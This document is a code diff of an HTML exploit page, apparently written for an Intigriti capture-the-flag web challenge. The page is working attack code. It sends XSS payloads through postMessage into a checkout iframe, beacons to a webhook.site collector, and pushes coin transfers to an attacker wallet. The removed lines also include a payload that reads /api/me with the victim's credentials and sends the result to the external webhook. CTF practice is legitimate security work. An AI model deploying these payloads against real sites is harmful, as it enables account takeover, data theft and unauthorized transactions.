@@ -2,37 +2,27 @@
 <html>
 <head><title>FINAL</title></head>
 <body>
+<h1>FINAL EXPLOIT</h1>
 <div id="log"></div>
 <script>
 const T = 'https://challenge-0126.intigriti.io';
-const W = 'https://webhook.site/4ef6fff2-d35d-411e-baae-13ba21343475';
-const WALLET = '16472226db03703a192aa383237035a69f';
+const W = 'https://webhook.site/f0ef6eea-0485-4e00-b5a7-84973f0fd79f';
+const WALLET = '1f9c3f0d5ebe9960d50b5e030572d264df';
 let s = 0;
 
-function log(m) { s++; document.getElementById('log').innerHTML += '<div>['+s+'] '+m+'</div>'; new Image().src = W+'/?'+s+'='+encodeURIComponent(m); }
+function log(m) { s++; document.getElementById('log').innerHTML += '<div>['+s+'] '+m+'</div>'; new Image().src = W+'/?step='+s+'&msg='+encodeURIComponent(m); }
 
 async function exploit() {
-    log('STARTING FINAL EXPLOIT');
+    log('STARTING');
 
-    // XSS payload that will execute on challenge domain with admin cookies
-    // Steps: 1) Get flag, 2) Send coin, 3) Report success
-    const xssPayload = `&lt;img src=x onerror=&quot;
-        // Step 1: Steal flag from /api/me
-        fetch('${T}/api/me',{credentials:'include'}).then(r=>r.json()).then(d=>{
-            fetch('${W}/?FLAG='+encodeURIComponent(JSON.stringify(d)),{mode:'no-cors'});
-            // Step 2: Send 1 1337COIN to our wallet
-            fetch('${T}/api/transaction',{
-                method:'POST',
-                headers:{'Content-Type':'application/json'},
-                credentials:'include',
-                body:JSON.stringify({
-                    toAddress:'${WALLET}',
-                    currency:'1337COIN',
-                    amount:1
-                })
-            }).then(()=>fetch('${W}/?COIN_SENT=1',{mode:'no-cors'}));
-        });
-    &quot;&gt;`;
+    // Try multiple XSS payloads at once
+    const payloads = [
+        '&lt;img src=x onerror=&quot;fetch(\''+W+'/?xss=1\',{mode:\'no-cors\'})&quot;&gt;',
+        '&lt;svg onload=&quot;fetch(\''+W+'/?xss=2\',{mode:\'no-cors\'})&quot;&gt;',
+        '&lt;details open ontoggle=&quot;fetch(\''+W+'/?xss=3\',{mode:\'no-cors\'})&quot;&gt;',
+        '<img src=x onerror="fetch(\''+W+'/?xss=4\',{mode:\'no-cors\'})">',
+        '<svg onload="fetch(\''+W+'/?xss=5\',{mode:\'no-cors\'})">'
+    ];
 
     log('Loading checkout iframe...');
     const iframe = document.createElement('iframe');
@@ -40,25 +30,47 @@ async function exploit() {
     iframe.src = T + '/checkout.html?currency=1337COIN&price=0';
     document.body.appendChild(iframe);
 
-    await new Promise(r => { iframe.onload = r; setTimeout(r, 3000); });
+    await new Promise(r => setTimeout(r, 3000));
     log('Iframe loaded');
 
-    // Send transaction with XSS payload as address
-    log('Sending postMessage with XSS payload...');
+    // Try each payload
+    for(let i = 0; i < payloads.length; i++) {
+        log('Trying payload ' + (i+1));
+        try {
+            iframe.contentWindow.postMessage({
+                type: 'submitTransaction',
+                transaction: {
+                    toAddress: payloads[i],
+                    currency: '1337COIN',
+                    amount: 0
+                }
+            }, '*');
+            await new Promise(r => setTimeout(r, 500));
+        } catch(e) {
+            log('Error: ' + e.message);
+        }
+    }
+    log('All payloads sent');
+
+    // Also send to actual wallet with amount=1
+    log('Sending coins to wallet...');
     iframe.contentWindow.postMessage({
         type: 'submitTransaction',
         transaction: {
-            toAddress: xssPayload,
+            toAddress: WALLET,
             currency: '1337COIN',
-            amount: 0
+            amount: 1
         }
     }, '*');
-    log('postMessage sent');
+    log('Coin sent');
 
-    // Wait and redirect to marketwatch where XSS triggers
-    await new Promise(r => setTimeout(r, 3000));
-    log('Redirecting to marketwatch (XSS will trigger)...');
-    window.location.href = T + '/marketwatch.html';
+    await new Promise(r => setTimeout(r, 2000));
+    log('DONE - Admin should visit marketwatch for XSS');
+
+    // Force admin to marketwatch via popup
+    const win = window.open(T + '/marketwatch.html', '_blank');
+    if(win) log('Opened marketwatch');
+    else log('Popup blocked - XSS in transactions waiting');
 }
 
 setTimeout(exploit, 1000);
